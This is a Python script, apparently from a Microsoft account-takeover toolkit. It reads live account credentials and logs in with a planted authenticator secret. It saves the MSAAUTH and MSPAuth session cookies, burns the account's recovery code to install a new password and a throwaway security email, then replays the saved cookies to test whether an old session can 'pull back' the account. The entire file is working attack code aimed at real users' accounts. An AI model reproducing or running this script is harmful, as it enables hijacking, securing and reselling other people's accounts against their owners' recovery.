#!/usr/bin/env python3
"""Experiment: save MSAAUTH cookies, burn RC via RecoverUser, then replay cookies.

Hypothesis: a pre-RecoverUser __Host-MSAAUTH / MSPAuth session might still hit
account.live.com after the RC is consumed (bypassing the new password).

Uses forensics/mcfa_LIVE_CREDS_after_experiment.txt when present.
"""
from __future__ import annotations

import asyncio
import json
import time
import uuid
from pathlib import Path

from database.database import DBConnection
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.autobuy_hold_check import fetch_credential_type
from securing.utils.cookies.safe_cookies import has_cookie, iter_cookies
from securing.utils.login_authenticator import login_authenticator
from securing.utils.proxy import close_session
from securing.utils.security.password_gen import generate_ms_password
from securing.utils.security.recovery import recover

CREDS = Path("forensics/mcfa_LIVE_CREDS_after_experiment.txt")
OUT = Path("forensics/msaauth_reuse_experiment.json")
DOMAIN = "ilovevbucks.site"


def load_creds() -> dict:
    d: dict[str, str] = {}
    if not CREDS.exists():
        raise SystemExit(f"missing {CREDS}")
    for line in CREDS.read_text().splitlines():
        if "=" in line:
            k, v = line.split("=", 1)
            d[k.strip()] = v.strip()
    return d


def snap_auth_cookies(session) -> list[dict]:
    names = {
        "__Host-MSAAUTH",
        "__Host-MSAAUTHP",
        "MSPAuth",
        "MSPProf",
        "MSPOK",
        "MSPCID",
        "PPLState",
    }
    out = []
    for c in iter_cookies(session):
        if c.name in names:
            out.append(
                {
                    "name": c.name,
                    "value": c.value,
                    "domain": getattr(c, "domain", None),
                    "path": getattr(c, "path", "/"),
                    "secure": getattr(c, "secure", True),
                }
            )
    return out


def inject_cookies(session, cookies: list[dict]) -> None:
    for c in cookies:
        session.cookies.set(
            c["name"],
            c["value"],
            domain=c.get("domain") or ".live.com",
            path=c.get("path") or "/",
        )


async def probe_session(session, label: str) -> dict:
    """Hit a few authenticated endpoints; return status summary."""
    result: dict = {"label": label, "has_msaauth": False, "probes": {}}
    result["has_msaauth"] = bool(
        has_cookie(session, "__Host-MSAAUTH") or has_cookie(session, "MSPAuth")
    )
    targets = [
        ("manage", "https://account.live.com/proofs/manage/additional?mkt=en-US&refd=account.microsoft.com"),
        ("names", "https://account.live.com/names/manage?mkt=en-US&refd=account.microsoft.com"),
        ("amc", "https://account.microsoft.com/?lang=en-US"),
    ]
    for name, url in targets:
        try:
            r = await session.get(url, follow_redirects=True, timeout=30.0)
            text = r.text or ""
            result["probes"][name] = {
                "status": r.status_code,
                "final_url": str(r.url)[:180],
                "len": len(text),
                "login_redirect": "login.live.com" in str(r.url).lower(),
                "has_canary": "apiCanary" in text or "sCanary" in text,
                "title_snip": (
                    text[text.lower().find("<title>") + 7 : text.lower().find("</title>")][:80]
                    if "<title>" in text.lower()
                    else ""
                ),
            }
        except Exception as exc:
            result["probes"][name] = {"error": f"{exc.__class__.__name__}: {exc}"}
    return result


async def main() -> None:
    creds = load_creds()
    email = creds["email"]
    password = creds.get("password") or ""
    rc = creds.get("recovery_code") or ""
    totp = creds.get("planted_totp") or ""
    report: dict = {
        "experiment": "msaauth_reuse_after_rc",
        "started": time.time(),
        "email": email,
        "phases": {},
    }

    # --- Phase A: establish MSAAUTH (prefer TOTP if planted) ---
    session_a = get_session()
    try:
        print("=== Phase A: login + snapshot MSAAUTH ===")
        login_ok = False
        if totp and password:
            r = await login_authenticator(
                session_a, email, {"password": password, "auth_secret": totp}
            )
            report["phases"]["totp_login"] = r
            login_ok = r is True
            print("totp_login", r)
        if not login_ok:
            report["error"] = "could not establish MSAAUTH before RecoverUser"
            OUT.write_text(json.dumps(report, indent=2, default=str))
            print("ABORT — no login")
            return

        # polish if we somehow have urlPost leftover — cookies alone are enough
        try:
            await polish_host(session_a, {"_cookies_only": True})
        except Exception as exc:
            report["phases"]["polish_err"] = repr(exc)

        saved = snap_auth_cookies(session_a)
        report["phases"]["saved_cookie_names"] = [c["name"] for c in saved]
        report["phases"]["pre_recover_probe"] = await probe_session(session_a, "pre")
        print("saved", report["phases"]["saved_cookie_names"])
        print("pre probe", json.dumps(report["phases"]["pre_recover_probe"], indent=2)[:800])
    finally:
        await close_session(session_a)

    if not saved:
        report["error"] = "no MSAAUTH cookies captured"
        OUT.write_text(json.dumps(report, indent=2, default=str))
        return

    # --- Phase B: RecoverUser on a FRESH session (burns RC) ---
    sec2 = f"{uuid.uuid4().hex[:16]}@{DOMAIN}"
    pwd2 = generate_ms_password(16)
    with DBConnection() as db:
        db.add_security_email(sec2, pwd2)

    session_b = get_session()
    try:
        print("=== Phase B: RecoverUser (fresh session) ===", sec2)
        new_rc = await recover(session_b, email, rc, sec2, pwd2)
        report["phases"]["recover"] = {
            "new_rc": new_rc,
            "sec": sec2,
            "pwd_set": bool(pwd2),
        }
        print("recover ->", new_rc)
        if not new_rc or new_rc == "invalid":
            report["error"] = "RecoverUser failed — RC not burned; cookie replay inconclusive"
            OUT.write_text(json.dumps(report, indent=2, default=str))
            return
        # persist new secrets so we don't lose the account
        CREDS.write_text(
            "\n".join(
                [
                    f"email={email}",
                    f"password={pwd2}",
                    f"security_email={sec2}",
                    f"recovery_code={new_rc}",
                    f"planted_totp={totp}",
                    "password_verified=False",
                    "phase=msaauth_reuse_post_recover",
                ]
            )
            + "\n"
        )
    finally:
        await close_session(session_b)

    await asyncio.sleep(3)

    # --- Phase C: replay saved cookies on a brand-new client ---
    session_c = get_session()
    try:
        print("=== Phase C: replay saved MSAAUTH ===")
        inject_cookies(session_c, saved)
        report["phases"]["post_recover_replay"] = await probe_session(session_c, "replay")
        print(
            "replay",
            json.dumps(report["phases"]["post_recover_replay"], indent=2)[:1200],
        )
    finally:
        await close_session(session_c)

    # --- Phase D: control — fresh login with NEW password (+ totp if still alive) ---
    session_d = get_session()
    try:
        print("=== Phase D: control login with post-recover password ===")
        if totp:
            r = await login_authenticator(
                session_d, email, {"password": pwd2, "auth_secret": totp}
            )
            report["phases"]["control_new_pwd_totp"] = r
            print("control totp", r)
        gct = await fetch_credential_type(email)
        c = (gct or {}).get("Credentials") or {}
        report["phases"]["gct_after"] = {
            "HasPhone": c.get("HasPhone"),
            "HasRemoteNGC": c.get("HasRemoteNGC"),
            "Otc": [
                p.get("display") for p in (c.get("OtcLoginEligibleProofs") or [])
            ],
        }
    finally:
        await close_session(session_d)

    pre = report["phases"].get("pre_recover_probe") or {}
    post = report["phases"].get("post_recover_replay") or {}
    pre_ok = any(
        (p or {}).get("has_canary") and not (p or {}).get("login_redirect")
        for p in (pre.get("probes") or {}).values()
        if isinstance(p, dict)
    )
    post_ok = any(
        (p or {}).get("has_canary") and not (p or {}).get("login_redirect")
        for p in (post.get("probes") or {}).values()
        if isinstance(p, dict)
    )
    report["verdict"] = {
        "pre_recover_session_alive": pre_ok,
        "saved_msaauth_still_works_after_rc_recover": post_ok,
        "note": (
            "If post_ok is False, RecoverUser (or associated session revoke) killed "
            "the saved MSAAUTH — cookie reuse is NOT a pullback vector here."
        ),
    }
    OUT.write_text(json.dumps(report, indent=2, default=str))
    print("VERDICT", json.dumps(report["verdict"], indent=2))


if __name__ == "__main__":
    asyncio.run(main())
